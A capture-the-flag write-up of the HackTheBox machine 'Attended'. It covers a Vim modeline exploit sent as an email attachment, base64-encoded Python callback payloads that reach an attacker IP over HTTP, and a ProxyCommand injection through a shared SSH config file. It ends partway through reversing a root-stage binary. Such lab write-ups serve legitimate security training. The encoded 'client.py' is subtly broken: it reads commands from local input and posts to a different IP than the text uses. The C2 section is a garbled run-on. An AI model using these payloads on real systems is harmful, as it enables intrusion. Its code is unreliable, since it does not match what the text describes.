---
title: "Attended"
description: "Notes on Attended machine on HackTheBox"
pubDate: "Mar 1 2024"
heroImage: "/itemPreview.png"

---

# HackTheBox - Attended
## Introduction

Attended is an insane difficulty OpenBSD machine that presents a variety of different concepts like phishing, exploiting CVEs, bypassing outbound traffic restrictions, detecting misconfigurations and binary exploitation (with an interesting twist in the way the payload had to be delivered). Foothold is gained by exploiting a Vim modeline vulnerability in a text attachment sent as an email message. This results in remote command execution but since only HTTP outbound traffic is allowed a workaround is featured by using a simple HTTP client/server application. System enumeration leads to a shared directory where `ssh` configuration files can be written to be executed by another user (`freshness`), allowing to run arbitrary commands via the `ProxyCommand` configuration directive. An executable binary vulnerable to a stack-based buffer overflow is then exploited to gain code execution as root (on a different host) by delivering a malicious payload through an SSH private key (the vulnerable program is configured as the `AuthorizedKeysCommand` in the `sshd` configuration).


- Nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:08:48:10:a2:89:3b:bd:4a:c6:81:03:cb:20:04:f5 (RSA)
|   256 1a:41:82:21:9f:07:9d:cd:61:97:e7:fe:96:3a:8f:b0 (ECDSA)
|_  256 e0:6e:3d:52:ca:5a:7b:4a:11:cb:94:ef:af:49:07:aa (ED25519)
25/tcp open  smtp
| smtp-commands: proudly setup by guly for attended.htb Hello nmap.scanme.org [10.10.16.22], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ This is OpenSMTPD To report bugs in the implementation, please contact bugs@openbsd.org with full details 2.0.0: End of HELP info
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: Pipelining not supported
|   Hello: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     5.5.1 Invalid command: EHLO requires domain name
|   Help: 
|     220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
|     214- This is OpenSMTPD
|     214- To report bugs in the implementation, please contact bugs@openbsd.org
|     214- with full details
|     2.0.0: End of HELP info
|   NULL: 
|_    220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=2/26%Time=65DCAA40%P=x86_64-pc-linux-gnu%r(N
SF:ULL,3C,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x
SF:20ESMTP\x20OpenSMTPD\r\n")%r(Hello,72,"220\x20proudly\x20setup\x20by\x2
SF:0guly\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n501\x205\.5\.1\x
SF:20Invalid\x20command:\x20EHLO\x20requires\x20domain\x20name\r\n")%r(Hel
SF:p,D5,"220\x20proudly\x20setup\x20by\x20guly\x20for\x20attended\.htb\x20
SF:ESMTP\x20OpenSMTPD\r\n214-\x20This\x20is\x20OpenSMTPD\r\n214-\x20To\x20
SF:report\x20bugs\x20in\x20the\x20implementation,\x20please\x20contact\x20
SF:bugs@openbsd\.org\r\n214-\x20with\x20full\x20details\r\n214\x202\.0\.0:
SF:\x20End\x20of\x20HELP\x20info\r\n")%r(GenericLines,71,"220\x20proudly\x
SF:20setup\x20by\x20guly\x20for\x20attended\.htb\x20ESMTP\x20OpenSMTPD\r\n
SF:500\x205\.5\.1\x20Invalid\x20command:\x20Pipelining\x20not\x20supported
SF:\r\n")%r(GetRequest,71,"220\x20proudly\x20setup\x20by\x20guly\x20for\x2
SF:0attended\.htb\x20ESMTP\x20OpenSMTPD\r\n500\x205\.5\.1\x20Invalid\x20co
SF:mmand:\x20Pipelining\x20not\x20supported\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

- `Proudly setup by guly` could be a user on the machine

- Also we would add the hostname to our hosts file

`echo '<IP> attended.htb' >> /etc/hosts`

To begin with, we would start with testing SMTP on the machine, to do that we would use the tool named `swaks`

`swaks' primary design goal is to be a flexible, scriptable, transaction-oriented SMTP test tool. It handles SMTP features and extensions such as TLS , authentication, and pipelining; multiple version of the SMTP protocol including SMTP , ESMTP , and LMTP ; and multiple transport methods including unix-domain sockets, internet-domain sockets, and pipes to spawned processes.`

So we would start off by sending a test mail and start tcpdump to see the flow the connections

```
$swaks --to guly@attended.htb --from nonsec@attended.htb --server 10.129.225.66
=== Trying 10.129.225.66:25...
=== Connected to 10.129.225.66.
<-  220 proudly setup by guly for attended.htb ESMTP OpenSMTPD
 -> EHLO parrot
<-  250-proudly setup by guly for attended.htb Hello parrot [10.10.16.22], pleased to meet you
<-  250-8BITMIME
<-  250-ENHANCEDSTATUSCODES
<-  250-SIZE 36700160
<-  250-DSN
<-  250 HELP
 -> MAIL FROM:<nonsec@attended.htb>
<-  250 2.0.0: Ok
 -> RCPT TO:<guly@attended.htb>
<-  250 2.1.5 Destination address valid: Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Mon, 26 Feb 2024 16:30:03 +0100
 -> To: guly@attended.htb
 -> From: nonsec@attended.htb
 -> Subject: test Mon, 26 Feb 2024 16:30:03 +0100
 -> Message-Id: <20240226163003.003622@parrot>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> This is a test mailing
 -> 
 -> 
 -> .
<-  250 2.0.0: 3331cf49 Message accepted for delivery
 -> QUIT
<-  221 2.0.0: Bye
=== Connection closed with remote host.
```

Surely, after a minute or so we do get a connection request 

```
$ tcpdump -i tun0
.
.
.
.

16:32:29.441431 IP attended.htb.13565 > 10.10.16.22.smtp: Flags [S], seq 248342814, win 16384, options [mss 1338,nop,nop,sackOK,nop,wscale 6,nop,nop,TS val 62817644 ecr 0], length 0
.
.
```

Since we are getting a connection request to our SMTP port (i.e. 25), so now we would start our SMTP server from python modules

`$sudo python -m smtpd -c DebuggingServer -n 10.10.16.22:25`

- We send another mail and wait for a minute and we get a response 
```bash
$sudo python -m smtpd -c DebuggingServer -n 10.10.16.22:25

---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id E9D0D32CC4'
b'\tfor <nonsec@10.10.16.22>; Mon, 26 Feb 2024 16:30:16 +0100 (CET)'
b'Content-Type: multipart/alternative;'
b' boundary="===============1760328706339633587=="'
b'MIME-Version: 1.0'
b'Subject: Re: test Mon, 26 Feb 2024 16:30:03 +0100'
b'From: guly@attended.htb'
b'X-Peer: 10.129.225.66'
b''
b'--===============1760328706339633587=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b'hello, thanks for writing.'
b"i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible."
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============1760328706339633587==--'
------------ END MESSAGE ------------

```

From this response, maybe `freshness` is a user on the machine as well and `guly` will open emails from user `freshness`?

So we will change `--to` email 

This time we get different response from previous time
```bash
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id BD6DB32CC4'
b'\tfor <freshness@10.10.16.22>; Mon, 26 Feb 2024 16:56:56 +0100 (CET)'
b'Content-Type: multipart/alternative;'
b' boundary="===============8693798525484449627=="'
b'MIME-Version: 1.0'
b'Subject: Re: test Mon, 26 Feb 2024 16:57:21 +0100'
b'From: guly@attended.htb'
b'X-Peer: 10.129.225.66'
b''
b'--===============8693798525484449627=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b'hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)'
b''
b'p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.'
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============8693798525484449627==--'
------------ END MESSAGE ------------

```

There are some new points which are to be noted, from the new response

- Guly is expecting some kind of attachment
- Python2 environment on the gateway
- Gateway is configured to block any connection which in not RFC compliant
- Against proprietary e-mail attachments


So now I attached a blank `txt` file for the next one

```bash
---------- MESSAGE FOLLOWS ----------
b'Received: from attended.htb (attended.htb [192.168.23.2])'
b'\tby attendedgw.htb (Postfix) with ESMTP id 2AEED32CD2'
b'\tfor <freshness@10.10.16.22>; Mon, 26 Feb 2024 17:16:55 +0100 (CET)'
b'Content-Type: multipart/alternative;'
b' boundary="===============4616993148664675788=="'
b'MIME-Version: 1.0'
b'Subject: Re: test Mon, 26 Feb 2024 17:16:41 +0100'
b'From: guly@attended.htb'
b'X-Peer: 10.129.225.66'
b''
b'--===============4616993148664675788=='
b'Content-Type: text/plain; charset="us-ascii"'
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 7bit'
b''
b"thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax."
b'if everything is fine, you will find your config file within a few minutes in the /home/shared folder.'
b'test it ASAP and let me know if you still face that weird issue.'
b''
b''
b'---'
b'guly'
b''
b'OpenBSD user since 1995'
b'Vim power user'
b''
b'/"\\ '
b'\\ /  ASCII Ribbon Campaign'
b' X   against HTML e-mail'
b'/ \\  against proprietary e-mail attachments'
b''
b'--===============4616993148664675788==--'
------------ END MESSAGE ------------
```

Again we get a new response

- Guly uses `vim` a lot, in previous responses as well we can see the phrase `Vim power user`
- Our file will be added to `/home/shared`, but it might not be useful since `Guly` will verify it then implement it


If we narrow down our searching and dorking, we can find an actual working exploit of `Vim`, `CVE-2019-12735`

The exploit works by abusing how Vim handles modelines by escaping the sandbox of allowed modeline options with the `:source!` command

The PoC is
`:!uname -a||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="`

So in this we are gonna change `uname -a` which tells us about the system information such as kernel information etc, to ping our machine for PoC

So,
`:!ping -c 6 10.10.16.22||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="`

The reason I used `-c 6` is to limit the ping scan to 6 so that the machine doesn't ping indefinitely 


Again sending the mail and start the `tcpdump` to see if the `Guly` opened the file and it pinged back to us

`$swaks --to guly@attended.htb --from freshness@attended.htb --attach test.txt --server 10.129.225.34`

After a while we can see the ping requests

```bash
$sudo tcpdump -i tun0
.
.
.
.
.
.
07:24:45.788879 IP attended.htb.6966 > 10.10.16.22.smtp: Flags [R], seq 1623897546, win 0, length 0
07:24:45.788925 IP attended.htb.6966 > 10.10.16.22.smtp: Flags [R], seq 1623897546, win 0, length 0
07:24:54.844976 IP attended.htb > 10.10.16.22: ICMP echo request, id 54408, seq 0, length 64
07:24:54.845070 IP 10.10.16.22 > attended.htb: ICMP echo reply, id 54408, seq 0, length 64
07:24:54.944922 IP attended.htb > 10.10.16.22: ICMP echo request, id 48102, seq 0, length 64
07:24:54.944953 IP 10.10.16.22 > attended.htb: ICMP echo reply, id 48102, seq 0, length 64
07:24:56.975562 IP attended.htb > 10.10.16.22: ICMP echo request, id 54408, seq 1, length 64
07:24:56.975812 IP 10.10.16.22 > attended.htb: ICMP echo reply, id 54408, seq 1, length 64
07:24:57.066940 IP attended.htb > 10.10.16.22: ICMP echo request, id 48102, seq 1, length 64
07:24:57.066967 IP 10.10.16.22 > attended.htb: ICMP echo reply, id 48102, seq 1, length 64
07:25:00.170507 IP attended.htb > 10.10.16.22: ICMP echo request, id 54408, seq 2, length 64
07:25:00.170537 IP 10.10.16.22 > attended.htb: ICMP echo reply, id 54408, seq 2, length 64
.
.
.
.
.
.

```

We can conclude that Vim exploit is the intended way here


It might seem that the rest of the user part is going to be easy since we got an arbitrary code execution on the machine and just have to replace the command with reverse shell command

But the thing is the operationg system here is OpenBSD and not a typical linux machine and furhtermore upon furthermore testing with exploit, the reverse shell is not successful

My guess is that the connection is being blocked by some kind of firewall or something like that, and that is as well hinted when we sent mail to Guly, the reference of gateway and it will allow only RFC compliant connections

We need to write a script or a C2 server 

## C2 server implementation

In a normal C2 server, what happens is Client issues a command or a tasking through HTTP/HTTPS request and sends to server and it will execute it and gives output and then the client sleeps for some (say 'x') seconds (somewhere around 30 and 60 sec)

The issue here is that when the tasking is issued the client will have to for 30 seconds to send another tasking, the main issue which comes from this is that it is very slow

We can lower the sleep time but this will affect our stealthness and since we would be issuing commands in  a short time, it would become very obvious when someone sees the logs 

This is the traditional way of how C2 works

So what we are going to do is

Instead of the Client sleeping, we would make the server sleep, we have the client makes an http request to find tasking the server um has no tasks, but keeps the http request open so the client doesn't sleep the server keeps it open and then operator gives task and server sends to client and client runs it gives output and makes requests immediately so the downside to this is if anyone's looking at like statistics even if it's https you'll see like an https session open for like 28 seconds but only 40 bytes was transferred that's weird because that server is just responding super slow so you have a lot of weird things with that but the advantage is the client's not going to make many requests to the server so in the volume of request this is super low and if you're interactively typing commands the chance of you getting detected anyways is pretty high and the time it takes someone to detect these abnormal http requests is going to be higher than if you just spam something so our C2 that we're going to create is going to be this advanced way

### Approach

- Our C2 server will have divided in to parts, one would be our client, server, terminal and main file


Each of them would handle different tasks


So now we would send another file to guly and base64 encode the `client.py` and send the payload

```bash
$ cat test.txt

:!python2 -c 'from base64 import b64decode;exec(b64decode("aW1wb3J0IG9zDQppbXBvcnQgcHR5DQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCB0aW1lDQoNCmRlZiBleGVjdXRlX2NvbW1hbmQoY29tbWFuZCk6DQogICAgIyBDcmVhdUgYSBuZXcgcHNldWRvLXRlcm1pbmFsDQogICAgbWFzdGVyLCBzbGF2ZSA9IHB0eS5vcGVucHR5KCkNCiAgICANCiAgICAjIEV4ZWN1dGUgdGhlIGNvbW1hbmQgaW4gdGhlIHBzZXVkby10ZXJtaW5hbA0KICAgIHBpZCA9IG9zLmZvcmsoKQ0KICAgIGlmIHBpZCA9PSAwOiAgIyBDaGlsZCBwcm9jZXNzDQogICAgICAgIG9zLmR1cDIoc2xhdmUsIDApICAjIFJlZGlyZWN0IHN0YW5kYXJkIGlucHV0IHRvIHRoZSBzbGF2ZSBzaWRlIG9mIHRoZSBwc2V1ZG8tdGVybWluYWwNCiAgICAgICAgb3MuZHVwMihzbGF2ZSwgMSkgICMgUmVkaXJlY3Qgc3RhbmRhcmQgb3V0cHV0IHRvIHRoZSBzbGF2ZSBzaWRlIG9mIHRoZSBwc2V1ZG8tdGVybWluYWwNCiAgICAgICAgb3MuZHVwMihzbGF2ZSwgMikgICMgUmVkaXJlY3Qgc3RhbmRhcmQgZXJyb3IgdG8gdGhlIHNsYXZlIHNpZGUgb2YgdGhlIHBzZXVkby10ZXJtaW5hbA0KICAgICAgICBvcy5jbG9zZShtYXN0ZXIpICAgIyBDbG9zZSB0aGUgbWFzdGVyIHNpZGUgb2YgdGhlIHBzZXVkby10ZXJtaW5hbA0KICAgICAgICBvcy5jbG9zZShzbGF2ZSkgICAgIyBDbG9zZSB0aGUgc2xhdmUgc2lkZSBvZiB0aGUgcHNldWRvLXRlcm1pbmFsDQogICAgICAgIG9zLmV4ZWNscCgnL2Jpbi9zaCcsICcvYmluL3NoJywgJy1jJywgY29tbWFuZCkgICMgRXhlY3V0ZSB0aGUgY29tbWFuZA0KICAgIGVsc2U6ICAjIFBhcmVudCBwcm9jZXNzDQogICAgICAgIG9zLmNsb3NlKHNsYXZlKSAgIyBDbG9zZSB0aGUgc2xhdmUgc2lkZSBvZiB0aGUgcHNldWRvLXRlcm1pbmFsDQogICAgICAgIG91dHB1dCA9IG9zLmZkb3BlbihtYXN0ZXIpICAjIE9wZW4gdGhlIG1hc3RlciBzaWRlIG9mIHRoZSBwc2V1ZG8tdGVybWluYWwgZm9yIHJlYWRpbmcNCiAgICAgICAgcmV0dXJuIG91dHB1dC5yZWFkbGluZXMoKQ0KDQp3aGlsZSBUcnVlOg0KICAgIGNvbW1hbmQgPSBpbnB1dCgiRW50ZXIgYSBjb21tYW5kOiAiKQ0KICAgIG91dHB1dCA9IGV4ZWN1dGVfY29tbWFuZChjb21tYW5kKQ0KICAgIA0KICAgICMgU2VuZCB0aGUgY29tbWFuZCBvdXRwdXQgdG8gdGhlIHNlcnZlcg0KICAgIHJlcXVlc3RzLmdldCgiaHR0cDovLzEwLjAuMi4xNS9vdXRwdXQiLCBwYXJhbXM9eydxJzogJycuam9pbihvdXRwdXQpfSkNCiAgICANCiAgICB0aW1lLnNsZWVwKDEpICAjIE9wdGlvbmFsIGRlbGF5IHRvIGF2b2lkIGZsb29kaW5nIHRoZSBzZXJ2ZXINCg=="))' ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
```

Start the server and wait for a minute or so


```bash
$sudo python3 C2/main.py 
Starting web server
$ id
$ 
uid=1000(guly) gid=1000(guly) groups=1000(guly)

```

#### Enumeration on the machine

There is `tmp` directory and have a `config.swp`


```bash
$ > strings ./tmp/.config.swp
b0VIM 8.1
guly
attended.htb
~guly/tmp/.ssh/config
U3210
#"!
ServerAliveInterval 60
TCPKeepAlive yes
ControlPersist 4h
ControlPath /tmp/%r@%h:%p
ControlMaster auto
User freshness
Host *
```

This file looks like an SSH configuration file, based on the format and the original file path

https://www.ssh.com/academy/ssh/config


```bash
$ echo "Host *" > non.config

$ echo "  ProxyCommand python2 -c 'from base64 import b64decode;exec(b64decode(\"aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCndoaWxlIFRydWU6CiAgICByID0gcmVxdWVzdHMuZ2V0KCJodHRwOi8vMTAuMTAuMTYuMjIiKQogICAgb3V0cHV0ID0gb3MucG9wZW4oci50ZXh0LCAncicsIDEpCiAgICBwYXlsb2FkID0geyAncSc6IG91dHB1dCB9CiAgICByZXF1ZXN0cy5nZXQoImh0dHA6Ly8xMC4xMC4xNi4yMi9vdXRwdXQiLCBwYXJhbXM9cGF5bG9hZCkKICAgIHNsZWVwKC4yNSkKCg==\"))'" >> non.config

$ cp non.config /home/shared/non.config
```


Terminate the shell and start again, and then this shell connects back but with the user `freshness`

```bash 
$sudo python3 C2/main.py 
$ id

uid=1001(freshness) gid=1001(freshness) groups=1001(freshness)


```
We can now get the user flag from here, but first we would try to get a better shell


So I generated a ssh key on my machine 

```bash
$ ssh-keygen -f freshness
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in freshness
Your public key has been saved in freshness.pub
The key fingerprint is:
SHA256:Y3dSglFX0Ns5kFcZxXU2MNQGmLJuIReUr0OaZOip5Zg user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|        ooo *O*+%|
|         * + oo*+|
|      . . * . +o.|
|     . + = +  .o.|
|    . + S = .   .|
|     + + B o     |
|    *   . .      |
|   E .           |
|                 |
+----[SHA256]-----+

-----------------------------On the C2 shell-----------------------------------

$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0RLEnQhJfk7NeUrhVY+yi4nlE7vWuZzA4ooQuTgwOHfNlNSYR0TX4QtMxYhS5pGfUL/RJ8ulCYuc/W3lrKltJHiS51LSYa1oyJAfU+0kyV31TIYxo7Peq39tekvXKo2ZXaiKCti/A6QrVoOrusEyVFWgNaSLUkLTDQKSAjLZlVVtlCZRY7rfFutBVsDvVMq+3ogUJFhWNVYFk8T7ev9CdTWBbROUn9mj+bmfSh9s2Vv85YXqG1Y2QiTA0PY2krkL1gORiUHe8GCY2Jx+fO3XwidMYfReephLNtRQpvdK4kzGX4YSQTSQCe3eTgsaaIw815SnyEDZGE5KcwFw1UEpHgLbVLutd3jrZl6TlqD57KGDHo/Vaxcem/275WekzgXB/swcv2ZlpT9YrcO2nzO+UunRMu7skxzFrwxzCIgA+NdJ4Qv3N30fC2WJwNKci7BIH6N3JVugvwmRq+G9NTAqnr+GTZHavkp6XaSbqrG45pNh2PQCIZiNyWQQuvhWZkpk= user@parrot" >> ./.ssh/authorized_keys
 
$ cat ./.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5KAJndl1uEB6ChH88UKrpVh+nRuDqG2Hrbf497VNLlU+wOaBSLuy59U2CeQo8bJGxpg8ndFHdmwlwJkWP9EWj6rA31ZgZTNgP3nINRwxCwV0fFHD+PnROei9cIonFVQXOj6DldN5LGIwF5me0/mPiSll2M8BeHi2Mvzc035xPhG+dJjRRETAEiZ1I6JtrBC+eJAgWCiMDa2YWDq+nRbqflcUZ+7Zgos64l0OLO4OtZxuRO/q3cnjhwAfqrv3qb3dJ/DNfGUZMxcQpTcB6Bqxgk97TPDiDXVmY9QbB1k4L6m8sgnRxABklXhB8GwQcTKlDgk+HunEaDKReaSa7hDwz
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDR196fq3uxKrspchLS6w8ZomI/8nOIFDh5azTGE5mdWv1oL8GRCAyQ64QU9wP7i68aO5LGNXpcVT0iipIZzceRrAvUqjyzXwdgtmLdDUB1WIz9RsdpNCTw7tHywFktiPiKsOsCFxleG5tDD84K7xj0AN/hZ19zRFHoe7IBdAIL6Fsv9JP/C7K90q/+KxZxGjDA0fv/G9rsPV0I8oU9gSuZosMUaIVdwjh5JoTHD3BKrjFtcTI6k/d/BUy13e9a5Se9mV28xvwj9fJDF4RD3mCf3x3KZXNX46uaYKonC7lzll1t0gQBOkIwFLxmZUVHcckUoBT54vy30dbhnV1D8U9L
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8sVXdqTbgyhvNRzIbz1B0a7NZeADH0h/v2Xygw9lFJNJa5xZi1B+nqxyg9w1SqNG5eAE1DmmSUYT0R3ozVM15drpD3ZHLYHVZnMoJz7MU0TgFE03SKKdJ4h3QV3AKisIaisl0FxC7h7VxGJQCB1xjKmHw5tHg3NQDvTDs6fQFtFRL5kLrjbUsfTwv/1E///uJp8HJOasFpNUt7CCW62op6D3+S6khoFLFw0JV/d2Hi0DbO/bIE71BqJUS7QXpolDU6U8eKqqlnx+fK15rQJZ+lisxw36/xmganCyrFBZ6QwW8BGBxqKuU5mRvERCPdIw0NKdZMtyIjn7tqI2EHKel
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDETBngZBrO0O/FbZ+9RLOU3K9jCC0U6LNHUnfcHKQ9eANmGuofxhXEwz54ZxtU7TXPo4nfsEOMcKkwAjHvs8VOMpgVdxBUQTWm/DCHpwgYkfPx+p88rxxbGKP+JxMjWttOCA4a72PgneRLqTe2kIXJj7YfjHvrSBk16wQIpYo8P+8GlbJq3Kacn430WBZ0bq5VsJge1iUo80OG24GdcL+5R/dpD+PT8goxS1nFzuK9PsMa/ezUalD93EolYKRP9G714iUDqi1AR0bgCLc7O4PwREv+kfQTxl+TZ4EbiPw5xL08nF03uUseX39HCReGO7VauQqbsrA6O9iF3BzXxFXr
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0RLEnQhJfk7NeUrhVY+yi4nlE7vWuZzA4ooQuTgwOHfNlNSYR0TX4QtMxYhS5pGfUL/RJ8ulCYuc/W3lrKltJHiS51LSYa1oyJAfU+0kyV31TIYxo7Peq39tekvXKo2ZXaiKCti/A6QrVoOrusEyVFWgNaSLUkLTDQKSAjLZlVVtlCZRY7rfFutBVsDvVMq+3ogUJFhWNVYFk8T7ev9CdTWBbROUn9mj+bmfSh9s2Vv85YXqG1Y2QiTA0PY2krkL1gORiUHe8GCY2Jx+fO3XwidMYfReephLNtRQpvdK4kzGX4YSQTSQCe3eTgsaaIw815SnyEDZGE5KcwFw1UEpHgLbVLutd3jrZl6TlqD57KGDHo/Vaxcem/275WekzgXB/swcv2ZlpT9YrcO2nzO+UunRMu7skxzFrwxzCIgA+NdJ4Qv3N30fC2WJwNKci7BIH6N3JVugvwmRq+G9NTAqnr+GTZHavkp6XaSbqrG45pNh2PQCIZiNyWQQuvhWZkpk= user@parrot
```

Now we can SSH into the machine

```bash
$ssh -i freshness freshness@attended.htb
OpenBSD 6.5 (GENERIC) #13: Sun May 10 23:16:59 MDT 2020

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

attended$ cat user.txt
b0390ad535424c0981699b93041a3ff1

```


## Privilege escalation

Files in the directory are

```bash
attended$ ls -al
total 52
drwxr-x---  4 freshness  freshness   512 Nov 12  2020 .
drwxr-xr-x  5 root       wheel       512 Jun 26  2019 ..
-rw-r--r--  1 freshness  freshness    87 Jun 26  2019 .Xdefaults
-rw-r--r--  1 freshness  freshness   771 Jun 26  2019 .cshrc
-rw-r--r--  1 freshness  freshness   101 Jun 26  2019 .cvsrc
-rw-r--r--  1 freshness  freshness   359 Jun 26  2019 .login
-rw-r--r--  1 freshness  freshness   175 Jun 26  2019 .mailrc
-rw-r--r--  1 freshness  freshness   215 Jun 26  2019 .profile
drwx------  2 freshness  freshness   512 Aug  6  2019 .ssh
drwxr-x---  2 freshness  freshness   512 Nov 16  2020 authkeys
-rw-r--r--  1 freshness  freshness  1265 Mar  3 08:02 dead.letter
-rwxr-x---  1 root       freshness   422 Jun 28  2019 fchecker.py
-r--r-----  1 root       freshness    33 Jun 26  2019 user.txt
```

- fchecker.py
```python
#!/usr/local/bin/python2.7
import os,sys
import subprocess
import time

path = '/home/shared/'
command = '/usr/bin/ssh -l freshness -F %s 127.0.0.1'
for r, d, fs in os.walk(path):
        for f in fs:
                cfile = os.path.join(r, f)
                c = command % cfile
                #print "running %s" % c
                p = subprocess.Popen(c,shell=True)
		time.sleep(0.2)
                os.unlink(cfile)
```
- dead.letter
```
attended$ cat dead.letter
Date: Sun, 3 Mar 2024 08:08:01 +0100 (CET)
From: root (Cron Daemon)
To: freshness
Subject: Cron <freshness@attended> /home/freshness/fchecker.py
Auto-Submitted: auto-generated
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/home/freshness>
X-Cron-Env: <LOGNAME=freshness>
X-Cron-Env: <USER=freshness>

```

There is a bianry file named `authkey`

```bash
attended$ cd authkeys  

attended$ ls   
authkeys note.txt

attended$ cat note.txt
on attended:
[ ] enable authkeys command for sshd
[x] remove source code
[ ] use nobody
on attendedgw:
[x] enable authkeys command for sshd
[x] remove source code
[ ] use nobody

attended$ file authkeys
authkeys: ELF 64-bit LSB executable, x86-64, version 1

```

I have transfered the binary to local machine

Since this is an OpenBSD binary it won't run on linux 

I boot up another OpenBSD virtual machine to run and analyse this binary

Also there is a mention of `attendedgw` which is supposedly the gateway

I pressume the IP of the gateway is 

```bash
attended$ ifconfig
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 32768
	index 3 priority 0 llprio 3
	groups: lo
	inet6 ::1 prefixlen 128
	inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
	inet 127.0.0.1 netmask 0xff000000
vio0: flags=8b43<UP,BROADCAST,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST> mtu 1500
	lladdr 00:10:20:30:40:50
	index 1 priority 0 llprio 3
	groups: egress
	media: Ethernet autoselect
	status: active
	inet 192.168.23.2 netmask 0xffffff00 broadcast 192.168.23.255
enc0: flags=0<>
	index 2 priority 0 llprio 3
	groups: enc
	status: active
pflog0: flags=141<UP,RUNNING,PROMISC> mtu 33136
	index 4 priority 0 llprio 3
	groups: pflog

attended$ ping -c 1 192.168.23.1
PING 192.168.23.1 (192.168.23.1): 56 data bytes
64 bytes from 192.168.23.1: icmp_seq=0 ttl=255 time=0.315 ms
--- 192.168.23.1 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss

```

On enumerating the gateway the only interesting ports which I can see is port `2222` which have SSH on the attendedgw


### Authkey binary

The binary seems to take some arguements, 5 (including the name of the binary as well)

```bash
obsd# ./authkeys a b c d   
Evaluating key...
Sorry, this damn thing is not complete yet. I'll finish asap, promise!
```

This binary is deployed on the gateway so there must be something interesting

I will reverse engineer this binary with IDA and not 


- When the number of arguments is not equal to five, it prints a message saying "too bad" and exits. This part is not clearly visualized in the IDA graph, but it's evident that the program exits after printing the message, as indicated by the use of system call exit (syscall 1).

- However, when there are exactly five arguments (including the program name), the program continues to execute. It first prints the message "Evaluating key" using the write syscall (syscall 4).

- Then, it enters a loop starting from the address stored in [rbp + arg_0], where arg_0 is set to 8. This address points to the first argument string passed to the program, and it's stored in the register rsi. The program initializes rbx and rcx to 0, and sets the low byte to five.

- Next, it enters a double loop, which likely involves iterating over the characters in the argument strings and performing some operations. The details of these operations are not provided, but it seems to be a crucial part of the program's functionality.






- The function starts by setting the register r8 to the start of the key string, which is the string to be decoded. This register is used to read a byte from the key string, and it is then incremented to move to the next byte.

- The function decodes the base64-encoded data by iterating over each character of the key string. This process involves decoding each character into its corresponding byte value.

- There is a limitation in the program where it only allocates 768 bytes of space on the stack to hold the decoded bytes. This limitation arises from the fact that base64 encoding inflates data, meaning that the decoded output may be larger than the encoded input. Specifically, the program can only decode keys up to 1024 bytes in length when base64 encoded.





- The top square represents a loop that decrements the rcx register and exits the loop if it becomes zero. Initially, rcx is set to five, so the loop runs five times. Inside this loop, the program enters another loop, which is represented by the bottom square.

